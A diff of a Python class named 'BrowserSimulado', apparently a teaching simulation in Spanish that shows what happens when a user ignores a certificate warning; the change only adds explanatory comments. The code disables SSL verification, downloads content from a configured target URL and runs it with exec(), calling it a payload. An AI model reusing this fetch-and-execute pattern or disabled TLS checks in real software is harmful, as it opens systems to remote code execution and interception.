@@ -79,24 +79,24 @@ class BrowserSimulado:
 
     def ejecutar_ataque(self):
         # 3. Conexión ignorando advertencia
-        warnings.simplefilter('ignore', InsecureRequestWarning)
+        warnings.simplefilter('ignore', InsecureRequestWarning)  #Desactiva advertencias de seguridad
         
         try:
-            response = requests.get(URL_OBJETIVO, verify=False)
+            response = requests.get(URL_OBJETIVO, verify=False) # Ignora verificación SSL y cogemos la direccion definida al principio
             
             if response.status_code == 200:
-                contenido_malicioso = response.content.decode('utf-8-sig')
+                contenido_malicioso = response.content.decode('utf-8-sig') #Devuelve el contenido del payloady lo convierte a string
                 
                 # 4. Simulación de ejecución
                 # Capturamos lo que el "virus" imprime para mostrarlo en una ventana
-                f = StringIO()
-                with contextlib.redirect_stdout(f):
+                f = StringIO() # Buffer para capturar salida
+                with contextlib.redirect_stdout(f): # Redirige la salida estándar al buffer
                     try:
-                        exec(contenido_malicioso)
+                        exec(contenido_malicioso) # Ejecuta el código malicioso
                     except Exception as e:
                         print(f"Error ejecutando payload: {e}")
                 
-                resultado_virus = f.getvalue()
+                resultado_virus = f.getvalue() # Obtiene todo lo que se imprimió
                 
                 messagebox.showwarning("¡INFECTADO!", f"Has ignorado la advertencia.\n\nEl servidor ejecutó:\n{resultado_virus}")
                 self.root.destroy() # Cierra el navegador simulado
